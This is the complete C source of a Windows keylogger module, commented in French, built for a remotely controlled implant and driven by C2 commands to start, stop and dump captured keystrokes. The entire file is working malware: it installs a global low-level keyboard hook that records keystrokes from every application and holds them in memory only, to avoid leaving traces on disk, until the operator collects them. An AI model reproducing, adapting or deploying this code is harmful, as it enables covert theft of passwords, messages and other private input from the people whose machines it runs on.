/*
 * keylog.c — Module keylogger (thread dédié, buffer en mémoire)
 *
 * Capture les frappes clavier via un hook bas-niveau Windows
 * (SetWindowsHookExA WH_KEYBOARD_LL) tournant dans un thread dédié.
 *
 * Architecture :
 *   - Un thread séparé installe le hook clavier et pompe les messages
 *     Windows (boucle GetMessage obligatoire pour que le hook fonctionne).
 *   - Chaque frappe est convertie en texte (ToUnicode) ou en tag lisible
 *     ([TAB], [BS], [ESC], etc.) et ajoutée au buffer circulaire.
 *   - Le buffer est protégé par une CRITICAL_SECTION pour l'accès
 *     concurrent entre le thread hook et le thread principal (implant).
 *   - Aucune I/O disque : tout reste en mémoire (65 Ko max).
 *
 * Commandes C2 :
 *   keylog_start  → démarre le thread + hook clavier
 *   keylog_stop   → arrête le thread (PostThreadMessage WM_QUIT)
 *   keylog_dump   → retourne les frappes capturées et vide le buffer
 *
 * MITRE ATT&CK : T1056.001 — Input Capture: Keylogging
 */

/* winsock2.h doit précéder windows.h (sinon conflit de redéfinition) */
#include <winsock2.h>
#include <windows.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "keylog.h"

/* Taille max du buffer de capture (64 Ko).
 * Au-delà, les frappes sont ignorées jusqu'au prochain keylog_dump. */
#define KEYLOG_BUF_SIZE 65536

/* ========================= État global du keylogger ========================= */

static HANDLE  kl_thread  = NULL;   /* handle du thread de capture           */
static DWORD   kl_tid     = 0;      /* TID du thread (pour PostThreadMessage) */
static volatile int kl_running = 0; /* flag d'état (volatile pour visibilité inter-threads) */

/* Buffer partagé entre le thread hook et le thread principal.
 * Accès protégé par kl_lock (CRITICAL_SECTION). */
static CRITICAL_SECTION kl_lock;
static char   kl_buf[KEYLOG_BUF_SIZE];
static int    kl_pos = 0;

/* ========================= Fonctions internes ========================= */

/*
 * buf_append — Ajoute une chaîne au buffer de capture (thread-safe).
 *
 * Appelée depuis le callback du hook clavier (keyboard_proc).
 * Si le buffer est plein, la frappe est silencieusement ignorée.
 */
static void buf_append(const char *s, int len)
{
    EnterCriticalSection(&kl_lock);
    if (kl_pos + len < KEYLOG_BUF_SIZE - 1) {
        memcpy(kl_buf + kl_pos, s, len);
        kl_pos += len;
        kl_buf[kl_pos] = 0;
    }
    LeaveCriticalSection(&kl_lock);
}

/*
 * vk_to_tag — Convertit un Virtual Key code en tag lisible.
 *
 * Retourne :
 *   - "\r\n"   pour Enter
 *   - "[TAB]"  pour Tab, "[BS]" pour Backspace, etc.
 *   - ""       pour les modifiers (Shift, Ctrl, Alt, Win) — ignorés
 *   - NULL     pour les touches normales → sera traité par ToUnicode
 */
static const char *vk_to_tag(DWORD vk)
{
    switch (vk) {
        case VK_RETURN:  return "\r\n";
        case VK_TAB:     return "[TAB]";
        case VK_BACK:    return "[BS]";
        case VK_ESCAPE:  return "[ESC]";
        case VK_DELETE:   return "[DEL]";
        case VK_LEFT:    return "[LEFT]";
        case VK_RIGHT:   return "[RIGHT]";
        case VK_UP:      return "[UP]";
        case VK_DOWN:    return "[DOWN]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_LSHIFT: case VK_RSHIFT:   return "";
        case VK_LCONTROL: case VK_RCONTROL: return "";
        case VK_LMENU: case VK_RMENU:     return "";
        case VK_LWIN: case VK_RWIN:       return "";
        default: return NULL;
    }
}

/*
 * keyboard_proc — Callback du hook clavier bas-niveau (WH_KEYBOARD_LL).
 *
 * Appelée par Windows pour chaque événement clavier système.
 * On ne traite que WM_KEYDOWN et WM_SYSKEYDOWN (pas les key-up).
 *
 * Flux de conversion :
 *   1. Virtual key → tag spécial (vk_to_tag) ? → buf_append du tag
 *   2. Sinon → GetKeyboardState + ToUnicode → caractère UTF-8 → buf_append
 *   3. Si ToUnicode échoue → buf_append du code hex [0xNN]
 *
 * CallNextHookEx passe l'événement au prochain hook dans la chaîne
 * (obligatoire pour ne pas bloquer les autres applications).
 */
static LRESULT CALLBACK keyboard_proc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;

        /* Tentative de conversion en tag spécial (Enter, Tab, etc.) */
        const char *tag = vk_to_tag(kbd->vkCode);
        if (tag) {
            int len = (int)strlen(tag);
            if (len > 0)
                buf_append(tag, len);
        } else {
            /* Touche normale : conversion via ToUnicode.
             * GetKeyboardState récupère l'état des modifiers (Shift, CapsLock)
             * pour que ToUnicode produise la bonne casse. */
            BYTE kb_state[256] = {0};
            GetKeyboardState(kb_state);
            WCHAR wc[4] = {0};
            int ret = ToUnicode(kbd->vkCode, kbd->scanCode, kb_state, wc, 4, 0);
            if (ret > 0) {
                /* Conversion UTF-16 → UTF-8 pour stockage dans le buffer */
                char mb[8] = {0};
                int mb_len = WideCharToMultiByte(CP_UTF8, 0, wc, ret,
                                                  mb, sizeof(mb), NULL, NULL);
                if (mb_len > 0)
                    buf_append(mb, mb_len);
            } else {
                /* Touche sans caractère imprimable → format hex [0xNN] */
                char hex[8];
                int n = snprintf(hex, sizeof(hex), "[0x%02X]", (unsigned)kbd->vkCode);
                buf_append(hex, n);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/* ========================= Thread de capture ========================= */

/*
 * keylog_thread — Point d'entrée du thread de capture.
 *
 * 1. Installe le hook clavier global (WH_KEYBOARD_LL)
 * 2. Boucle de messages Windows (GetMessage) — obligatoire car
 *    les hooks bas-niveau nécessitent une message pump pour recevoir
 *    les callbacks.
 * 3. Quand kl_running passe à 0 ou WM_QUIT reçu → décroche le hook.
 *
 * Le hook est global (paramètre threadId=0) : il capture les frappes
 * de TOUTES les applications, pas seulement le processus courant.
 */
static DWORD WINAPI keylog_thread(LPVOID param)
{
    (void)param;

    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboard_proc, NULL, 0);
    if (!hook) {
        kl_running = 0;
        return 1;
    }

    /* Boucle de messages — GetMessage bloque jusqu'à recevoir un message.
     * PostThreadMessage(WM_QUIT) depuis keylog_stop() fait sortir la boucle. */
    MSG msg;
    while (kl_running && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    return 0;
}

/* ========================= API publique ========================= */

/*
 * keylog_start — Démarre le keylogger dans un thread dédié.
 *
 * Initialise le mutex (CRITICAL_SECTION), vide le buffer, et crée
 * le thread de capture qui installe le hook clavier.
 *
 * Retourne 0 si OK, -1 si déjà actif ou échec CreateThread.
 */
int keylog_start(void)
{
    if (kl_running)
        return -1;

    InitializeCriticalSection(&kl_lock);

    /* Vide le buffer avant de démarrer */
    EnterCriticalSection(&kl_lock);
    kl_buf[0] = 0;
    kl_pos    = 0;
    LeaveCriticalSection(&kl_lock);

    kl_running = 1;
    kl_thread  = CreateThread(NULL, 0, keylog_thread, NULL, 0, &kl_tid);
    if (!kl_thread) {
        kl_running = 0;
        DeleteCriticalSection(&kl_lock);
        return -1;
    }

    return 0;
}

/*
 * keylog_stop — Arrête le keylogger et termine le thread.
 *
 * Envoie WM_QUIT au thread de capture via PostThreadMessage,
 * attend sa terminaison (3s max), puis libère les ressources.
 *
 * Retourne 0 si OK, -1 si le keylogger n'était pas actif.
 */
int keylog_stop(void)
{
    if (!kl_running)
        return -1;

    kl_running = 0;
    PostThreadMessage(kl_tid, WM_QUIT, 0, 0);
    WaitForSingleObject(kl_thread, 3000);
    CloseHandle(kl_thread);
    kl_thread = NULL;
    kl_tid    = 0;

    DeleteCriticalSection(&kl_lock);
    return 0;
}

/*
 * keylog_dump — Retourne les frappes capturées et vide le buffer.
 *
 * Retourne un string malloc'd que l'appelant doit free().
 * Cas de retour :
 *   - "[keylogger not running]\r\n"     si le keylogger est inactif
 *   - "[no keystrokes captured]\r\n"    si le buffer est vide
 *   - contenu du buffer + "\r\n"        sinon (frappes capturées)
 *
 * Le buffer est vidé après chaque dump pour éviter les doublons.
 */
char *keylog_dump(void)
{
    if (!kl_running) {
        char *msg = (char *)malloc(32);
        if (msg)
            strcpy(msg, "[keylogger not running]\r\n");
        return msg;
    }

    EnterCriticalSection(&kl_lock);
    int len = kl_pos;
    char *out = (char *)malloc(len + 32);
    if (out) {
        if (len == 0) {
            strcpy(out, "[no keystrokes captured]\r\n");
        } else {
            memcpy(out, kl_buf, len);
            out[len] = '\r';
            out[len + 1] = '\n';
            out[len + 2] = 0;
        }
        /* Vide le buffer après extraction */
        kl_buf[0] = 0;
        kl_pos    = 0;
    }
    LeaveCriticalSection(&kl_lock);

    return out;
}
